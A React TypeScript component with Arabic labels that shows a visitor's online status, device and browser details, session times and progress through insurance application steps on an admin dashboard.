import type { InsuranceApplication } from "@/lib/firestore-types";
import { formatDistanceToNow } from "date-fns";
import { ar } from "date-fns/locale";

interface VisitorTrackingInfoProps {
  visitor: InsuranceApplication;
}

export function VisitorTrackingInfo({ visitor }: VisitorTrackingInfoProps) {
  const formatTimestamp = (timestamp: string | undefined) => {
    if (!timestamp) return "غير متوفر";

    try {
      const date = new Date(timestamp);
      return formatDistanceToNow(date, { addSuffix: true, locale: ar });
    } catch {
      return "غير متوفر";
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-2.5">
        <div
          className={`w-3 h-3 rounded-full ${
            visitor.isOnline
              ? "bg-emerald-500 shadow-sm shadow-emerald-200"
              : "bg-gray-300"
          }`}
        />
        <span className={`text-sm font-semibold ${visitor.isOnline ? "text-emerald-600" : "text-gray-500"}`}>
          {visitor.isOnline ? "متصل الآن" : "غير متصل"}
        </span>
        {visitor.lastActiveAt && (
          <span className="text-xs text-gray-400">
            ({formatTimestamp(visitor.lastActiveAt as any)})
          </span>
        )}
      </div>

      {visitor.referenceNumber && (
        <div className="bg-blue-50/60 rounded-xl p-3 border border-blue-100">
          <p className="text-xs text-gray-500 mb-1 font-medium">الرقم المرجعي</p>
          <p className="font-mono font-bold text-blue-600">
            {visitor.referenceNumber}
          </p>
        </div>
      )}

      <div className="grid grid-cols-2 gap-3">
        {visitor.country && (
          <div className="bg-gray-50/80 rounded-xl p-3 border border-gray-100">
            <p className="text-xs text-gray-400 mb-1 font-medium">البلد</p>
            <p className="font-semibold text-gray-800">{visitor.country}</p>
          </div>
        )}

        {visitor.deviceType && (
          <div className="bg-gray-50/80 rounded-xl p-3 border border-gray-100">
            <p className="text-xs text-gray-400 mb-1 font-medium">نوع الجهاز</p>
            <p className="font-semibold text-gray-800 capitalize">{visitor.deviceType}</p>
          </div>
        )}

        {visitor.browser && (
          <div className="bg-gray-50/80 rounded-xl p-3 border border-gray-100">
            <p className="text-xs text-gray-400 mb-1 font-medium">المتصفح</p>
            <p className="font-semibold text-gray-800">{visitor.browser}</p>
          </div>
        )}

        {visitor.os && (
          <div className="bg-gray-50/80 rounded-xl p-3 border border-gray-100">
            <p className="text-xs text-gray-400 mb-1 font-medium">نظام التشغيل</p>
            <p className="font-semibold text-gray-800">{visitor.os}</p>
          </div>
        )}
      </div>

      <div className="bg-gray-50/80 rounded-xl p-3 border border-gray-100">
        <p className="text-xs text-gray-400 mb-2 font-medium">معلومات الجلسة</p>
        <div className="space-y-1 text-sm text-gray-700">
          {visitor.sessionStartAt && (
            <p>بدأ: {formatTimestamp(visitor.sessionStartAt)}</p>
          )}
          {visitor.createdAt && (
            <p>أول زيارة: {formatTimestamp(visitor.createdAt.toString())}</p>
          )}
        </div>
      </div>

      <div className="bg-gray-50/80 rounded-xl p-3 border border-gray-100">
        <p className="text-xs text-gray-400 mb-2 font-medium">تقدم الصفحات</p>
        <div className="space-y-2">
          {visitor.homeCompletedAt && (
            <div className="flex items-center justify-between text-sm">
              <span className="text-gray-700">معلومات أساسية</span>
              <span className="text-emerald-500 font-bold">✓</span>
            </div>
          )}
          {visitor.insurCompletedAt && (
            <div className="flex items-center justify-between text-sm">
              <span className="text-gray-700">بيانات التأمين</span>
              <span className="text-emerald-500 font-bold">✓</span>
            </div>
          )}
          {visitor.comparCompletedAt && (
            <div className="flex items-center justify-between text-sm">
              <span className="text-gray-700">مقارنة العروض</span>
              <span className="text-emerald-500 font-bold">✓</span>
            </div>
          )}
          {visitor.checkCompletedAt && (
            <div className="flex items-center justify-between text-sm">
              <span className="text-gray-700">الدفع والتحقق</span>
              <span className="text-emerald-500 font-bold">✓</span>
            </div>
          )}
        </div>
      </div>

      {visitor.isBlocked && (
        <div className="bg-red-50/60 border border-red-100 rounded-xl p-3">
          <p className="text-red-500 font-semibold">⚠️ محظور</p>
        </div>
      )}
    </div>
  );
}
